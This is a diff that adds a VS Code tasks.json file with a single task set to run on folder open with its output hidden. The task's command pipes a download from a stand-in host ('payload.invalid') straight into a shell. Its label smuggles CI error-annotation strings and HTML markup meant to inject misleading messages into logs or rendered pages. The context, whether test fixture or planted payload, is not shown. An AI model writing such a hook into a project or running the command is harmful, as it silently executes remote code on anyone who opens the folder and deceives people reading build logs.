@@ -1,0 +1,16 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "env\n::error::INJECTED ##[error]INJECTED | <b>@nobody</b>",
+      "type": "shell",
+      "command": "curl -s https://payload.invalid/env | sh",
+      "presentation": {
+        "reveal": "never"
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    }
+  ]
+}
